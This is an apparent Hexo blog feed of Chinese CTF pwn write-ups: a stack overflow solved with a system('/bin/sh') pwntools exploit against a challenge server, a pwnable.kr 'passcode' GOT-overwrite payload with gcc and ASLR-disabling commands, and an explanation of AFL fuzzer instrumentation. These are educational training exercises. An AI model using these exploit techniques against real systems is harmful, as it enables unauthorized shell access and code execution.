class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过上面的伪代码，我们可以得出：</p><p>    ① 我们可以往 <code>buf</code> 缓存中读入 <code>0x100u</code> 长的数据；</p><p>    ② 但是 <code>buf</code> 缓存离 <code>ebp</code> 的偏移只有 <code>0x1c</code> 长；</p><p>因为 <code>0x100u</code> &gt; <code>0x1c</code> ，意味者我们可以往 <code>buf</code> 中输入 256 大小的的数据，但是会产生一处的现象，出现我们输入的数据覆盖掉 ebp 以上的的数据。</p></blockquote><h4 id="font-color-navy2构造-payloadfont"><a class="markdownIt-Anchor" href="#font-color-navy2构造-payloadfont"></a> <font color="navy">2.构造 payload</font></h4><blockquote><p>现在我来画个示意图，来帮助大家理解：</p></blockquote><p><img src="/images/83-2.png" alt></p><blockquote><p>从上图我们可以知道构造 payload 的思路：</p><p>    ① 我们之所以要利用这个漏洞，是想要通过覆盖 <code>return address</code>  的内容，从而跳转到我们想要执行的函数上；</p><p>    ② 我们首先要填充 <code>buf</code> 和 <code>ebp</code> 部分，也就是 0x1c + 4 = 32 byte</p><p>    ③ 我们想要获取 <code>shell</code> ，所以在 <code>return address</code> 那里，我们要让它返回的地址是 <code>system()</code> 函数的地址；</p><p>    ④ 因为 pwn 是一个 32 位的 ELF 文件，所以我们还需要填充 4 个字节的数据；</p><p>    ⑤ 要想获得 <code>shell</code> ，我们就必须执行 <code>system（‘/bin/sh’）</code> 函数，所以下面我们还得填充 <code>system（）</code> 函数得参数地址；</p><p>经过上述的分析，我们可以得到下述的示意图：、</p></blockquote><p><img src="/images/83-3.png" alt></p><h3 id="font-color-brown三-解题过程font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题过程font"></a> <font color="brown">三、解题过程</font></h3><h4 id="font-color-navy1构造-payloadfont"><a class="markdownIt-Anchor" href="#font-color-navy1构造-payloadfont"></a> <font color="navy">1.构造 payload</font></h4><blockquote><p>payload = ‘a’ * 32 + p32(system_address) + ‘a’ * 4 + p32(bin/sh_address)</p><p><font color="red">注</font>：system_address 后面之所以还要加上一个 4 字节的填充，是因为在调用 system 函数后，再返回到我的返回地址(<code>‘a’ * 4</code>：充当的是虚拟的返回地址。我们只要控制在 4 个字节里就 ok！)。再填写我们需要压入栈中的参数 <code>/bin/sh</code> 。</p></blockquote><h4 id="font-color-navy2查找-system-函数和-binsh-的地址font"><a class="markdownIt-Anchor" href="#font-color-navy2查找-system-函数和-binsh-的地址font"></a> <font color="navy">2.查找 system 函数和 /bin/sh 的地址</font></h4><blockquote><p>在 IDA 中，可以查到 <code>system</code>  和 <code>/bin/sh</code> 的地址，如下：</p><p>a<img src="/images/83-4.jpg" alt></p><p><img src="/images/83-5.jpg" alt></p></blockquote><h4 id="font-color-navy3写-expfont"><a class="markdownIt-Anchor" href="#font-color-navy3写-expfont"></a> <font color="navy">3.写 exp</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9990</span>)</span><br><span class="line">system_address = <span class="number">0x080483F0</span></span><br><span class="line">bin_sh_address = <span class="number">0x0804A02C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span> + p32(system_address) + <span class="string">'b'</span>*<span class="number">4</span> + p32(bin_sh_address)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="font-color-navy4运行脚本得到-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy4运行脚本得到-flagfont"></a> <font color="navy">4.运行脚本，得到 flag</font></h4><p><img src="/images/83-6.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>bash 漏洞（pwnable-shellshock）</title>
    <link href="https://muzibing.github.io/2019/09/17/2019.09.17%EF%BC%8882%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/17/2019.09.17（82）/</id>
    <published>2019-09-16T16:00:00.000Z</published>
    <updated>2019-09-18T08:55:07.986Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-前言font"><a class="markdownIt-Anchor" href="#font-color-brown一-前言font"></a> <font color="brown">一、前言</font></h3><blockquote><p>pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：入门难、精通更难、入神超难，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 bash 的一种题型吧。</p></blockquote><h3 id="font-color-brown二-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown二-基础知识font"></a> <font color="brown">二、基础知识</font></h3><h4 id="font-color-navy1setresuidfont"><a class="markdownIt-Anchor" href="#font-color-navy1setresuidfont"></a> <font color="navy">1.setresuid</font></h4><blockquote><p>setresuid() 被执行的条件有：</p><p>    ① 当前进程的 euid 是 root</p><p>    ② 三个参数，每个等于原来某个 id 中的一个</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、前言&lt;/font&gt;&lt;/h3&gt;
&lt;b
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>GOT 表攻击实例（pwnbable.kr_passcode）</title>
    <link href="https://muzibing.github.io/2019/09/10/2019.09.10%EF%BC%8881%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/10/2019.09.10（81）/</id>
    <published>2019-09-09T16:00:00.000Z</published>
    <updated>2019-09-24T08:53:09.582Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-前言font"><a class="markdownIt-Anchor" href="#font-color-brown一-前言font"></a> <font color="brown">一、前言</font></h3><blockquote><p>pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：<font color="orage">入门难、精通更难、入神超难</font>，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 GOT 表的一种题型吧。</p></blockquote><h3 id="font-color-brown二-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown二-基础知识font"></a> <font color="brown">二、基础知识</font></h3><h4 id="font-color-navy1got-表font"><a class="markdownIt-Anchor" href="#font-color-navy1got-表font"></a> <font color="navy">1.GOT 表</font></h4><blockquote><p><strong>① 什么是 GOT 表？</strong></p><p>    每一个<font color="red"><strong>外部定义的符号</strong></font>在全局偏移表（<em>Global offset Table</em>）中有相应的条目，GOT位于ELF的<font color="red"><strong>数据段</strong></font>中，叫做GOT段。</p><p><strong>② GOT 表的作用是什么？</strong></p><p>    把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（<code>rtld</code>）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用<code>rtld</code>。</p><p><strong>③ 怎么查看 GOT 表？</strong></p><p>    在 Linux 系统里，我们可以通过  <code>objdump</code> 命令来查看程序的 GOT 表，具体的指令如下：</p><center> objdump  -R  file_name</center></blockquote><h4 id="font-color-navy2plt-表font"><a class="markdownIt-Anchor" href="#font-color-navy2plt-表font"></a> <font color="navy">2.PLT 表</font></h4><blockquote><p><strong>① 什么是 PLT 表？</strong></p><p>    过程连接表(<em>Procedure Linkage Table</em>)，一个PLT条目对应一个GOT条目。</p><p><br>    当 main() 函数开始，会请求 plt 中这个函数的对应 GOT 地址，如果第一次调用那么 GOT 会重定位到 plt，并向栈中压入一个偏移，程序的执行回到 _init() 函数，rtld得以调用就可以定位 printf 的符号地址，第二次运行程序再次调用这个函数时程序跳入 plt，对应的 GOT 入口点就是真实的函数入口地址。</p><p><br>    动态连接器并不会把动态库函数在编译的时候就包含到 ELF 文件中,仅仅是在这个 ELF 被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在 ELF 文件中的 GOT 中保留一个调用地址。</p><p><strong>② GOT 表和 PLT 表的关系图</strong></p><p><img src="/images/81-1.png" alt></p></blockquote><h4 id="font-color-navy3scanf-的漏洞font"><a class="markdownIt-Anchor" href="#font-color-navy3scanf-的漏洞font"></a> <font color="navy">3.scanf 的漏洞</font></h4><blockquote><p>    如果对 scanf 的利用不加 &amp; ，会很有可能出现漏洞，在这道题目中，我将讲述该函数的漏洞利用。</p></blockquote><h4 id="font-color-navy4elf-文件保护机制font"><a class="markdownIt-Anchor" href="#font-color-navy4elf-文件保护机制font"></a> <font color="navy">4.ELF 文件保护机制</font></h4><blockquote><p><font color="orage"><strong>① NX(No-eXecute)</strong> </font></p><p>    NX 即 No-eXecute （不可执行）的意思，NX（DEP）的基本原理是<font color="red">将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</font></p><p><br>    工作原理如图：</p><p><img src="/images/81-2.jpg" alt></p><p>     gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p><p>     例如：</p><center>gcc -z execstack -o test test.c</center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c <span class="comment">// 默认情况下，开启NX保护</span></span><br><span class="line">&gt; gcc -z execstack -o test test.c<span class="comment">// 禁用NX保护</span></span><br><span class="line">&gt; gcc -z noexecstack -o test test.c <span class="comment">// 开启NX保护</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><font color="orage"><strong>② RELRO</strong></font></p><p>     relro 是一种用于加强对 binary 数据段的保护的技术。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为 ” <font color="red">Partial RELRO</font> ”，说明我们对GOT表具有写权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c <span class="comment">// 默认情况下，是Partial RELRO</span></span><br><span class="line">&gt; gcc -z norelro -o test test.c <span class="comment">// 关闭，即No RELRO</span></span><br><span class="line">&gt; gcc -z lazy -o test test.c <span class="comment">// 部分开启，即Partial RELRO</span></span><br><span class="line">&gt; gcc -z now -o test test.c <span class="comment">// 全部开启，即</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><font color="orage"><strong>③ CANNARY（栈保护）</strong></font></p><p>    这个选项<strong>表示栈保护功能有没有开启</strong>。</p><p><br>    栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p><br>    因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c // 默认情况下，不开启Canary保护</span><br><span class="line">&gt; gcc -fno-stack-protector -o test test.c //禁用栈保护</span><br><span class="line">&gt; gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">&gt; gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><font color="orage"><strong>④ FORTIFY</strong></font></p><p>    fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p><p><br>    _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p><p><br>    _FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p><p>     <code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p><p>     <code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p><p><font color="orage"><strong>⑤ PIE(ASLR)</strong></font></p><p>     PIE 即 <a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%9D%80%E6%97%A0%E5%85%B3%E4%BB%A3%E7%A0%81" target="_blank" rel="noopener">Postion-Indenpendent executable</a>(地址无关可执行文件)。一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p><br>    内存地址随机化机制（address space layout randomization)，有以下三种情况</p><p><br>    0 - 表示关闭进程地址空间随机化。</p><p>    1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>    2 - 表示在1的基础上增加栈（heap）的随机化。</p><p><br>    可以防范基于<font color="red"><strong>Ret2libc</strong></font>方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p><br>    Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p><p><br>    liunx下关闭PIE的命令如下：</p><p><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p></blockquote><h4 id="font-color-navy5got-表覆写技术font"><a class="markdownIt-Anchor" href="#font-color-navy5got-表覆写技术font"></a> <font color="navy">5.GOT 表覆写技术</font></h4><blockquote><p>    原理：由于<font color="red"><strong>got表是可写</strong></font>的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。</p></blockquote><h3 id="font-color-brown三-题目要求font"><a class="markdownIt-Anchor" href="#font-color-brown三-题目要求font"></a> <font color="brown">三、题目要求</font></h3><p><img src="/images/81-3.png" alt></p><blockquote><p>    该题要求我们连接 <a href="http://pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a> 的服务器，密码是 guest，经过尝试我在 Linux 系统环境下连上去以后，看看了目录，如下：</p></blockquote><p><img src="/images/81-4.png" alt></p><blockquote><p>    题目可能是让我们通过这三个文件找出 flag。</p></blockquote><h3 id="font-color-brown四-解题思路font"><a class="markdownIt-Anchor" href="#font-color-brown四-解题思路font"></a> <font color="brown">四、解题思路</font></h3><blockquote><p>    在整理出解题思路之前，我们需要试探一下题目中的文件，看看文件有什么要求。</p><p><font color="orage"><strong>① 查看 passcode 的文件类型</strong></font></p><center>`file passcode`</center>![](/images/81-6.png)<p>    从上图可以看出，passcode 是一个 32 位的 ELF 文件。</p><p><font color="orage"><strong>② 查看 passcode 的保护机制</strong> </font></p><center>`checksec passcode`</center>![](/images/81-5.png)<p>    从上图可以说明：</p><ul><li>passcode 文件是 i386 的</li><li>我们对 GOT 有写的权限</li><li>开启了栈保护，也就意味着我们没有办法利用栈溢出</li></ul><p><font color="orage">**③ 查看 passcode.c 的源文件 **</font></p><p><img src="/images/81-7.png" alt></p><p>    从上图可以看到 scanf 语句中没有 <code>&amp;</code> 取值符号，所以我们可以根据这个来利用漏洞</p><p><font color="orage"><strong>④ 查看 welcome 和 login 函数</strong> </font></p><p>    通过分析 passcode.c 的源代码，我们可以发现 main（caller）连续调用了 welcome 和 login 函数，在调用的时候并没有 push 和 pop，所有这两个函数用的是同一个 ebp，如下图：</p><p><img src="/images/81-8.png" alt></p><p>    那么我们找到name位于ebp-0x70，passcode1位于ebp-0x10，passcode2位于ebp-0xc，name与passcode1之间隔了0x70-0x10=96个字节。</p><p><font color="orage"><strong>⑤ 如何利用 scanf 和 GOT 表漏洞</strong></font></p><p>   我们可以用 fflush() / printf() 的地址覆盖 passcode1 后，scanf(&quot;%d&quot;，&amp;fflush()) 将会把之后的输入写入到GOT表中，于是把 login() 中 system(&quot;/bin/cat flag&quot;) 的地址转换成十进制写进去，当程序调用fflush()的时候就会执行system()，思路如下图：</p><p><img src="/images/81-9.png" alt></p></blockquote><h3 id="font-color-brown五-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown五-解题步骤font"></a> <font color="brown">五、解题步骤</font></h3><h4 id="font-color-navy1构造-payloadfont"><a class="markdownIt-Anchor" href="#font-color-navy1构造-payloadfont"></a> <font color="navy">1.构造 payload</font></h4><blockquote><p>payload = ‘a’*96+’\x00\xa0\x04\x08’ +‘134514147\n’</p></blockquote><h4 id="font-color-navy2python-c-执行命令font"><a class="markdownIt-Anchor" href="#font-color-navy2python-c-执行命令font"></a> <font color="navy">2.python -c 执行命令</font></h4><blockquote><p><code>python - c &quot;print('a'*96+'\x00\xa0\x04\x08' +'134514147\n')&quot;|./passcode</code></p><p>    结果如下图：</p><p><img src="/images/81-10.png" alt></p></blockquote><h3 id="font-color-brown参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown参考文章font"></a> <font color="brown">参考文章</font></h3><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">GOT表和PLT表知识详解</a></p><p><a href="https://blog.csdn.net/kevin66654/article/details/78213690" target="_blank" rel="noopener">pwnable.kr - passcode</a></p><p><a href="https://blog.csdn.net/smalosnail/article/details/53027024" target="_blank" rel="noopener">pwnable 笔记 Toddler’s Bottle - passcode</a></p><p><a href="https://blog.csdn.net/smalosnail/article/details/53247502" target="_blank" rel="noopener">scanf忘记加’&amp;'危害有多大？ 详解GOT表覆写攻击技术</a></p><p><a href="https://www.cnblogs.com/p4nda/p/7122094.html" target="_blank" rel="noopener">p4nda</a></p><p><a href="https://blog.csdn.net/u012763794/article/details/51992512" target="_blank" rel="noopener">通过pwnable.kr从零学pwn</a></p><p><a href="https://blog.csdn.net/summonlight/article/details/81123785" target="_blank" rel="noopener">C语言函数调用栈(一)</a></p><p><a href="https://blog.csdn.net/axiejundong/article/details/73065023" target="_blank" rel="noopener">软件常用安全防护手段 checksec 总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、前言&lt;/font&gt;&lt;/h3&gt;
&lt;b
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>AFL 的代码插桩问题</title>
    <link href="https://muzibing.github.io/2019/09/07/2019.09.07%EF%BC%8880%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/07/2019.09.07（80）/</id>
    <published>2019-09-06T16:00:00.000Z</published>
    <updated>2019-09-07T10:36:22.237Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-什么是-aflfont"><a class="markdownIt-Anchor" href="#font-color-brown一-什么是-aflfont"></a> <font color="brown">一、什么是 AFL？</font></h3><blockquote><p>    AFL 是一款用于发现漏洞的<font color="red"><strong>模糊测试工具</strong></font>，是由下面三个部分组成的：</p><ul><li><p>编译器wrapper：他的功能在于对目标软件（开源）进行编译，编译过程中插入一些AFL识别的函数用以识别探索路径，众所周知的linux下的C/C<ins>编译工具gcc/g</ins>，afl的编译工具为afl-gcc/afl-g++,afl-clang等。</p></li><li><p>测试器fuzzer （主体）：<code>afl-fuzz</code>，就是AFL重要的主体，用以对软件进行fuzzing。</p></li><li><p>其他工具：如afl-cmin,afl-tmin等，一个成功的C位都必须多个辅助才行，这些工具都是为提升测试的效率和成功率而服务的。</p></li></ul><p>  它的工作流程如下图：</p><p><img src="/images/80-1.png" alt></p></blockquote><h3 id="font-color-brown二-代码插桩font"><a class="markdownIt-Anchor" href="#font-color-brown二-代码插桩font"></a> <font color="brown">二、代码插桩</font></h3><h4 id="font-color-navy1什么是插桩font"><a class="markdownIt-Anchor" href="#font-color-navy1什么是插桩font"></a> <font color="navy">1.什么是插桩？</font></h4><blockquote><p>    在AFL编译文件时候afl-gcc会在规定位置插入桩代码，可以理解为一个个的<font color="red"><strong>探针</strong></font>(但是没有暂停功能)，在后续fuzz的过程中会<font color="red"><strong>根据这些桩代码进行路径探索，测试等</strong>。</font>对于插桩的理解也可以这样理解，如下图：</p><p><img src="/images/80-2.jpg" alt></p><p>    如果我们输入的数据是：a = 3,b = 3，那么程序会输出多少呢？通过程序的执行可以得到一个路径：<font color="red">ABDCFG</font>，那么在这个程序里 printf 语句就是我们插入的代码。</p><p>​    在简单的了解了什么是插桩后，下面我们来介绍一下 afl 中的插桩。</p></blockquote><h4 id="font-color-navy2afl-中的插桩font"><a class="markdownIt-Anchor" href="#font-color-navy2afl-中的插桩font"></a> <font color="navy">2.AFL 中的插桩</font></h4><blockquote><p><strong>① 插桩存在 afl 测试中的哪一个环节？</strong></p><p>​     <img src="/images/80-3.png" alt></p><p>​     从上面的图中可以得出，AFL 的插桩是在编译的过程中同时进行插桩的，afl-gcc 是 afl 的一个编译器，是将源语言编译成汇编代码，而插桩是在汇编代码汇编成机器代码的过程中进行的，对于linux来说，as 是常用的汇编器，那么 afl-as 便会作为汇编器，执行实际的汇编操作。<font color="red">所以说，AFL 的代码插桩，就是将源文件编译成汇编代码后，通过<code>afl-as</code>来完成的</font>。 afl-as 会生成<strong>一个随机数</strong>，作为标识分支的 key。</p><p><img src="/images/80-5.png" alt></p><p>​     在这里需要值得注意的是，实际插桩是 <code>afl-as</code> 来完成的，那么为什么又说 <code>afl-gcc</code> 是来插桩的呢？因为 afl-gcc 的源码中在头文件中调用了 afl-as.h 所以说是将 afl-as 的功能装进了 afl-gcc 里。</p><p><img src="/images/80-4.jpg" alt></p><p><strong>② AFL 中的编译器</strong></p><p>​     对于 afl 的编译器来说有两种，一种是 afl-gcc，一种是 afl-clang，通过查看源码可以得到，这两个编译器实际上是 gcc、clang 的一个 wrapper。</p><p><strong>③ 如何进行插桩</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_instrumentation</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">&gt;     <span class="keyword">if</span> (input_file)</span><br><span class="line">&gt;    &#123; <span class="comment">//打开输入文件</span></span><br><span class="line">&gt;         inf = fopen(input_file, <span class="string">"r"</span>);</span><br><span class="line">&gt;         <span class="keyword">if</span> (!inf) PFATAL(<span class="string">"Unable to read '%s'"</span>, input_file);</span><br><span class="line">&gt;     &#125; </span><br><span class="line">&gt;     <span class="keyword">else</span> </span><br><span class="line">&gt;         inf = <span class="built_in">stdin</span>;</span><br><span class="line">&gt;     outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>); <span class="comment">//创建输出文件</span></span><br><span class="line">&gt;     <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) </span><br><span class="line">&gt;         PFATAL(<span class="string">"Unable to write to '%s'"</span>, modified_file);</span><br><span class="line">&gt;     outf = fdopen(outfd, <span class="string">"w"</span>);</span><br><span class="line">&gt;     <span class="keyword">if</span> (!outf) </span><br><span class="line">&gt;         PFATAL(<span class="string">"fdopen() failed"</span>); </span><br><span class="line">&gt;     <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) <span class="comment">//读取输入的每行</span></span><br><span class="line">&gt;     &#123; </span><br><span class="line">&gt;         <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; <span class="comment">//它只会在代码里的合适位置插桩而不会对文件每行插桩，判断代码在下面，</span></span><br><span class="line">&gt;         instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">'\t'</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) </span><br><span class="line">&gt;         &#123;</span><br><span class="line">&gt;             <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, <span class="comment">//关键处，会根据位数选择对应模板</span></span><br><span class="line">&gt;             R(MAP_SIZE)); <span class="comment">//R(MAP_SIZE)定义为 # define R(x) (random() % (x))</span></span><br><span class="line">&gt;             instrument_next = <span class="number">0</span>;</span><br><span class="line">&gt;             ins_lines++;</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;         <span class="built_in">fputs</span>(line, outf); <span class="comment">//输出</span></span><br><span class="line">&gt;         <span class="comment">//以下为如上插桩条件判断代码。。。</span></span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>​     执行的插桩代码实际上是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>​     这里要以 32 位的模板为例，给出要插入的 <code>trampoline_fmt_32</code> 的汇编代码段，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt; static const u8* trampoline_fmt_32 =</span><br><span class="line">&gt; </span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;.align 4\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">&gt;   &quot;movl %%edi, 0(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%edx, 4(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%ecx, 8(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">&gt;   &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">&gt;   &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">&gt;   &quot;movl 8(%%esp), %%ecx\n&quot;</span><br><span class="line">&gt;   &quot;movl 4(%%esp), %%edx\n&quot;</span><br><span class="line">&gt;   &quot;movl 0(%%esp), %%edi\n&quot;</span><br><span class="line">&gt;   